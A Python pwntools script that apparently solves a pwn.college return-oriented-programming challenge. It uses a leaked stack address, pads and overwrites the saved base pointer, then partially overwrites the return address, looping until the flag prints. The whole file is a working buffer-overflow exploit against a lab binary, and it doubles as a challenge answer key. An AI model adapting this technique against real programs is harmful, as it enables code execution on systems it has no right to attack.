from pwn import *
import sys

context.log_level = 'debug'
context.binary = exe = ELF('/challenge/babyrop_level11.0', checksec=False)
libc = exe.libc

def info(x):
    return log.info(x)

while True:
    try:
        r = process(exe.path)
        r.recvuntil(b'[LEAK] Your input buffer is located at: ')
        leak_input = int(r.recvn(14), 16)
        address_win = leak_input - 8
        overwriterbp = address_win - 8
        info("The address of input start at: " + hex(leak_input))
        info("The address on the stack store win function: " + hex(address_win))
        #offset: 80 to retaddr
        payload = b'a'*72
        payload += p64(overwriterbp)
        payload += 0x67af.to_bytes(2, 'little')
        r.send(payload)
        res = r.recvall()
        if b'pwn.college{' in res:
            print(res)
            r.close()
            exit(1)
    except Exception as e:
        r.close()